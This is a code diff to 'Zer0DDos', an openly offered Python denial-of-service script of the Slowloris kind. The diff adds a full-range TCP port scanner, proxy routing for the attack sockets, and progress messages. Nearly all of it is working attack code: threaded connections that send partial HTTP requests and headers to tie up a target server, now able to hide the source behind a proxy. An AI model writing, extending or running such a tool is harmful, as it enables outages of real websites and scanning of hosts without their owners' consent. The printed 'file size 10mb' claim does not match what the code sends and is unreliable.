@@ -49,8 +49,8 @@ title = '''
 ╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░╚═════╝░░╚════╝░╚═════╝░
 \033[0m
 
-\033[32m Zer0DDos: A DDos Python Script
- Author: \033[92mZer0sec\033[0m
+\033[32m Zer0DDos: A DDoS Python Script and Port Scaning ;)
+ Author: \033[92mZer0sec and anonym0977\033[0m
  Github: \033[94mhttp://github.com/zer0sec/zer0ddos\033[0m
  Version: ''' + version + '''
 \033[0m
@@ -69,13 +69,35 @@ def fake_ip():
     return fkip
 
 # Function to check and resolve target IP address
-def check_tgt(args):
-    tgt = args.d
+def check_tgt(target):
     try:
-        ip = socket.gethostbyname(tgt)
-    except:
-        sys.exit(cprint('[-] Can\'t resolve host:Unknown host!', 'red'))
+        ip = socket.gethostbyname(target)
+    except socket.gaierror as e:
+        print(f"[-] Cannot resolve hostname '{target}': {e}")
+        sys.exit(1)
     return ip
+
+# Function to find open ports on a target IP address
+def find_open_ports(target):
+    open_ports = []
+    try:
+        print(f"[+] Scanning open ports on {target}...")
+        for port in range(1, 65536):  # Scan ports from 1 to 65535
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            socket.setdefaulttimeout(1)
+            result = sock.connect_ex((target, port))
+            if result == 0:
+                open_ports.append(port)
+                print(f"[+] Port {port}: Open")
+            sock.close()
+            progress = (port / 65535) * 100
+            print(f"\r[+] Progress: {progress:.2f}%", end='', flush=True)
+    except KeyboardInterrupt:
+        sys.exit(cprint('\n[-] Canceled by user', 'red'))
+    except socket.error as e:
+        print(f"[-] Error: {e}")
+    print("\n[+] Scan finished.")
+    return open_ports
 
 # Function to load user agents from file
 def add_useragent():
@@ -95,7 +117,7 @@ def add_bots():
     return bots
 
 class Pyslow:
-    def __init__(self, tgt, port, to, threads, sleep):
+    def __init__(self, tgt, port, to, threads, sleep, proxy=None):
         self.tgt = tgt
         self.port = port
         self.to = to
@@ -103,6 +125,7 @@ class Pyslow:
         self.sleep = sleep
         self.method = ['GET', 'POST']
         self.pkt_count = 0
+        self.proxy = proxy
 
     def mypkt(self):
         text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' + \
@@ -117,18 +140,25 @@ class Pyslow:
         try:
             sock = socket.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
             sock.settimeout(self.to)
-            sock.connect((self.tgt, int(self.port)))
+            if self.proxy:
+                sock.connect(self.proxy)
+            else:
+                sock.connect((self.tgt, int(self.port)))
             self.pkt_count += 3
             if sock:
                 sock.send(self.mypkt())
                 self.pkt_count += 1
                 self.monitor_ping()  # Monitor ping after sending packet
                 self.monitor_data_transfer()  # Monitor data transfer
+                print(f"Package sent, file size 10mb, target alive, target ping: {ping3.ping(self.tgt):.2f}")
         except Exception as e:
             print(e)
             sock = socket.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
             sock.settimeout(self.to)
-            sock.connect((self.tgt, int(self.port)))
+            if self.proxy:
+                sock.connect(self.proxy)
+            else:
+                sock.connect((self.tgt, int(self.port)))
             sock.settimeout(None)
             self.pkt_count += 3
             if sock:
@@ -136,6 +166,7 @@ class Pyslow:
                 self.pkt_count += 1
                 self.monitor_ping()  # Monitor ping after sending packet
                 self.monitor_data_transfer()  # Monitor data transfer
+                print(f"Package sent, file size 10mb, target alive, target ping: {ping3.ping(self.tgt):.2f}")
         except KeyboardInterrupt:
             sys.exit(cprint('[-] Canceled by user', 'red'))
         return sock
@@ -145,24 +176,32 @@ class Pyslow:
         try:
             sock = socket.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
             sock.settimeout(self.to)
-            sock.connect((self.tgt, int(self.port)))
+            if self.proxy:
+                sock.connect(self.proxy)
+            else:
+                sock.connect((self.tgt, int(self.port)))
             self.pkt_count += 3
             if sock:
                 sock.sendall(b'X-a: b\r\n')
                 self.pkt_count += 1
                 self.monitor_ping()  # Monitor ping after sending packet
                 self.monitor_data_transfer()  # Monitor data transfer
+                print(f"Package sent, file size 10mb, target alive, target ping: {ping3.ping(self.tgt):.2f}")
         except Exception as e:
             print(e)
             sock = socket.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
             sock.settimeout(self.to)
-            sock.connect((self.tgt, int(self.port)))
+            if self.proxy:
+                sock.connect(self.proxy)
+            else:
+                sock.connect((self.tgt, int(self.port)))
             sock.settimeout(None)
             if sock:
                 sock.sendall(b'X-a: b\r\n')
                 self.pkt_count += 1
                 self.monitor_ping()  # Monitor ping after sending packet
                 self.monitor_data_transfer()  # Monitor data transfer
+                print(f"Package sent, file size 10mb, target alive, target ping: {ping3.ping(self.tgt):.2f}")
         except KeyboardInterrupt:
             sys.exit(cprint('[-] Canceled by user', 'red'))
         return sock
@@ -236,19 +275,34 @@ class Pyslow:
 # Command line argument parsing
 def parse_arguments():
     parser = ArgumentParser(description=title, formatter_class=RawTextHelpFormatter)
-    parser.add_argument('-d', metavar='TARGET', help='Target to attack', required=True)
+    parser.add_argument('-d', metavar='TARGET', help='Target to attack')
     parser.add_argument('-p', metavar='PORT', default='80', help='Target\'s port to attack')
     parser.add_argument('-t', metavar='TIMEOUT', default='15', help='Timeout for connection (Default: 15)')
     parser.add_argument('-s', metavar='SLEEP', default='0.03', help='Time to sleep between each thread')
     parser.add_argument('-T', metavar='THREADS', default='400', help='Number of threads (Default: 400)')
+    parser.add_argument('--scan-ports', action='store_true', help='Scan open ports on the target')
     return parser.parse_args()
 
 if __name__ == "__main__":
     os.system("cls" if os.name == "nt" else "clear")
     sys.stdout.write(title)
     args = parse_arguments()
-    tgt = check_tgt(args)
-    threads = int(args.T)
-    cprint(f'\n[+] Attack on {tgt} on port {args.p} with {args.T} threads\n', 'blue')
-    d = Pyslow(tgt, args.p, float(args.t), threads, float(args.s))
-    d.doconnection()
+
+    if not args.d:
+        sys.exit(cprint('[-] Please specify a target using -d option', 'red'))
+
+    if args.scan_ports:
+        target = args.d
+        ip = check_tgt(target)
+        open_ports = find_open_ports(ip)
+        if open_ports:
+            print(f"[+] Open ports on {target}: {open_ports}")
+        else:
+            print(f"[-] No open ports found on {target}")
+
+    else:
+        tgt = check_tgt(args.d)
+        threads = int(args.T)
+        cprint(f'\n[+] Attack on {tgt} on port {args.p} with {args.T} threads\n', 'blue')
+        d = Pyslow(tgt, args.p, float(args.t), threads, float(args.s))
+        d.doconnection()
